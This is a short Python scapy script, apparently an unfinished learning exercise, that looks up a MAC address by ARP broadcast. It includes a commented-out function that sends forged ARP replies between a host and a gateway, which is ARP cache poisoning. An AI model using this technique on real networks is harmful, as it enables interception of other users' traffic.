import scapy.all as scapy


import scapy.all as scapy

def get_mac(ip): 
    arp_request = scapy.ARP(pdst = ip)
    # arp_request.pdst = ip
    # arp_request.show()  #(show all fields in the ARP )
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    # broadcast.dst = "ff:ff:ff:ff:ff:ff"
    # broadcast.show()
    arp_request_broadcast = broadcast/arp_request
    # arp_request_broadcast.show()
    # print(arp_request_broadcast.summary())
    answered_list = scapy.srp(arp_request_broadcast,timeout=1)[0]
    # answered_list is in form  of a list
    
    print(answered_list[0][1].hwsrc)

get_mac("20.20.21.185")

# def spoof(target_ip,spoof_ip):
#     target_mac = get_mac(target_ip)
#     packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
#     scapy.send(packet)

# spoof("20.20.20.185","20.20.20.1")
# spoof("20.20.20.1","20.20.20.185")
		
